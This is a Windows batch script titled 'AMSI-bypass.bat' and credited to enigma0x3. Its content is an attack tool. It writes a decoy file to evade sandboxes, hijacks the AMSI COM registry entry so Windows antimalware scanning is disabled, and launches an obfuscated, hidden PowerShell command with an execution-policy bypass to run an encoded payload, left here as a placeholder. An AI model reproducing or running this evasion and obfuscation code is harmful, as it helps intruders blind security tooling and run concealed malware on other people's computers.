::
:: [ AMSI-bypass.bat - enigma0x3 ]
::
@echo off
:: Writte file to disk to evade sandbox detection
echo microsoft > %userprofile%\\license.pem
:: AMSI COM Bypass [ enigma0x3 ]
REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} /f
REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
:: Sleep time to refresh regedit
sleep 3
:: local batch variable declarations
sEt !h=e&& sEt 1D=n&& set db0=p&& sEt !e=i
:: Powershell command obfuscated
@C%0D%m^D"."e^X%!h% /%i0%c =%db0%o"W"%!h%rS^hel%i0%"L".%!h%xE -%1D%O^%db0% -W%!e%%1D% h%!e%%i0%dD%!h%N -%!h%P bY%db0%AS%H1%s -%1D%O^N%!e% -%!h%N $ENCODED-SHELLCODE-BASE64
exit
